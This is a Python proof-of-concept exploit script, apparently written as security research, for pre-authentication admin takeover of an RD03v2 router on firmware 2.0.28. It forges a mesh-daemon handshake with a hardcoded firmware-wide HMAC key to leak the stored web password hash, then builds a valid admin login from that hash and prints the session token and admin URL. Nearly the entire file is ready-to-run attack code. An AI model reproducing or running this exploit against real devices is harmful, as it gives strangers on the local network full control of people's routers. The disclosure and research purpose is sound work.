#!/usr/bin/env python3
"""Pre-auth admin takeover of RD03v2 stock 2.0.28, end to end.

Two device-independent facts chain into full admin access with no credentials:

  A. cab_meshd (CAP mode, TCP 19553) accepts any TLS client (SSL_VERIFY_NONE)
     and authenticates peers with a FIRMWARE-GLOBAL HMAC key (0xcabb, byte 0 ->
     'q' for the server's verify path). So a LAN-adjacent attacker can complete
     the mesh handshake to ST_RUNNING, at which point the CAP sends its sync
     config -- which includes `web_passwd256`, the sha256 the web login checks
     against (XQSecureUtil.checkUser: sha256(nonce .. stored) == password).

  B. The LuCI login (api/xqsystem/login, jsonauth) needs only that stored hash:
     password = sha256(nonce .. web_passwd256), nonce = <type>_<mac>_<time>_<r>.

So: leak the hash over the mesh port (A), then mint an admin session from it (B).
No password is ever guessed or cracked -- the router hands over the verifier.

This is READ-ONLY against the target: the mesh half stops before the type-7 that
would trigger cap_init (no wifi reconfiguration), and the web half only logs in
and reads. Nothing is written.

Usage:
    ./extract_admin.py --host 192.168.31.1
"""

import argparse
import base64
import hashlib
import hmac
import json
import re
import socket
import ssl
import struct
import subprocess
import sys
import time
import urllib.parse
import urllib.request

CONST = b"838d364d8ed3bd085e150211ea6b3715"
VER = 0x1001
HDR = 0x2c


def log(m):
    print(m, flush=True)


# ----------------------------------------------------------- A: mesh hash leak


def q_pass(ident: bytes) -> bytes:
    return base64.b64encode(hmac.new(b"q" + CONST[1:], ident, hashlib.sha256).digest())


def leak_config(host, port, ident, timeout=20.0, hold=6.0):
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        ctx.set_ciphers("ALL:@SECLEVEL=0")
    except ssl.SSLError:
        pass
    # cab_meshd has a small connection-slot pool and frees a stalled slot only
    # after its own timeout, so the first TLS handshake may time out; retry.
    s = None
    for _i in range(4):
        try:
            s = ctx.wrap_socket(socket.create_connection((host, port), timeout=timeout))
            break
        except (TimeoutError, socket.timeout, ssl.SSLError, OSError) as _e:
            if _i == 3:
                raise
            log(f"[!] TLS connect {_i+1}/4 failed ({type(_e).__name__}); "
                f"cab_meshd slot busy, waiting 15s")
            time.sleep(15)
    log(f"[A] TLS up on {host}:{port} ({s.version()}, no client cert)")

    def hdr(typ, blen):
        h = bytearray(HDR)
        h[0:2] = struct.pack(">H", VER)
        h[2:4] = struct.pack(">H", blen)
        h[4:6] = struct.pack(">H", typ)
        return bytes(h)

    # type-4 auth_req: id@0, pass@0x10 (q-key HMAC)
    b4 = bytearray(0xa4)
    b4[0:len(ident)] = ident
    p = q_pass(ident)
    b4[0x10:0x10 + len(p)] = p
    s.sendall(hdr(4, len(b4)) + bytes(b4))
    log("[A] sent type-4 auth (forged constant-key HMAC)")

    # type-5 auth_reply: body[0]=1 -> ST_RUNNING -> CAP sends its sync config
    time.sleep(1.0)
    b5 = bytearray(0x20)
    b5[0] = 1
    s.sendall(hdr(5, len(b5)) + bytes(b5))
    log("[A] sent type-5 auth-reply -> driving to ST_RUNNING")

    deadline = time.time() + hold
    buf = b""
    s.settimeout(1.0)
    cfg = None
    while time.time() < deadline and cfg is None:
        try:
            chunk = s.recv(4096)
        except (socket.timeout, ssl.SSLWantReadError):
            continue
        except OSError:
            break
        if not chunk:
            break
        buf += chunk
        while len(buf) >= HDR:
            _, blen, typ = struct.unpack(">HHH", buf[0:6])
            if len(buf) < HDR + blen:
                break
            body, buf = buf[HDR:HDR + blen], buf[HDR + blen:]
            if typ == 6:
                js, je = body.find(b"{"), body.rfind(b"}")
                if js != -1 and je > js:
                    cfg = body[js:je + 1]
    # NB: we deliberately never send type-7, so cap_init does not run.
    try:
        s.close()
    except OSError:
        pass
    if cfg is None:
        raise RuntimeError("no sync config received; is the target in CAP mode?")
    return json.loads(cfg)


# ----------------------------------------------------------- B: admin login


def local_mac(host):
    try:
        out = subprocess.run(["ip", "-o", "route", "get", host],
                             capture_output=True, text=True, timeout=5).stdout
        dev = re.search(r"\bdev\s+(\S+)", out)
        if dev:
            return open(f"/sys/class/net/{dev.group(1)}/address").read().strip()
    except Exception:
        pass
    return "00:00:00:00:00:00"


def http(url, data=None, timeout=45):
    body = urllib.parse.urlencode(data).encode() if data is not None else None
    req = urllib.request.Request(url, data=body)
    req.add_header("Connection", "close")
    for attempt in range(4):
        try:
            with urllib.request.urlopen(req, timeout=timeout) as r:
                return r.read().decode("utf-8", "replace")
        except (urllib.error.URLError, TimeoutError, socket.timeout, OSError) as e:
            if attempt == 3:
                raise
            log(f"    (retry {attempt + 1}: {type(e).__name__})")
            time.sleep(6)


def login(host, stored_hash, mac):
    import random
    nonce = f"0_{mac}_{int(time.time())}_{random.randint(0, 9999)}"
    password = hashlib.sha256((nonce + stored_hash).encode()).hexdigest()
    res = json.loads(http(f"http://{host}/cgi-bin/luci/api/xqsystem/login",
                          {"username": "admin", "password": password, "nonce": nonce}))
    return res


def main():
    ap = argparse.ArgumentParser(description=__doc__.split("\n")[0])
    ap.add_argument("--host", default="192.168.31.1")
    ap.add_argument("--port", type=int, default=19553)
    ap.add_argument("--id", default="attacker0001")
    ap.add_argument("--timeout", type=float, default=20.0,
                    help="per-attempt TLS timeout (cab_meshd is slow; default 20)")
    args = ap.parse_args()

    log(f"[*] target {args.host}")
    log("[*] Phase A: extract the admin hash over the mesh port (pre-auth)")
    cfg = leak_config(args.host, args.port, args.id.encode(), timeout=args.timeout)
    h256 = cfg.get("web_passwd256", "")
    h1 = cfg.get("web_passwd", "")
    log(f"[A] leaked web_passwd256 = {h256}")
    log(f"[A] leaked web_passwd    = {h1}")
    log(f"[A] cap_ip={cfg.get('cap_ip')!r} cap_mode={cfg.get('cap_mode')!r}")
    if not h256:
        log("[-] no web_passwd256 in the sync config; aborting")
        return 1

    log("[*] Phase B: forge an admin session from the leaked hash")
    mac = local_mac(args.host)
    res = login(args.host, h256, mac)
    if res.get("code") == 0 and res.get("token"):
        log(f"[B] LOGIN OK  stok={res['token']}")
        log("")
        log("[+] pre-auth -> admin. The router disclosed its own login verifier")
        log("    over the mesh port and accepted a session minted from it.")
        log(f"    Admin UI: http://{args.host}/cgi-bin/luci/;stok={res['token']}/web/home")
        return 0
    log(f"[-] login did not succeed: {res}")
    return 1


if __name__ == "__main__":
    sys.exit(main())
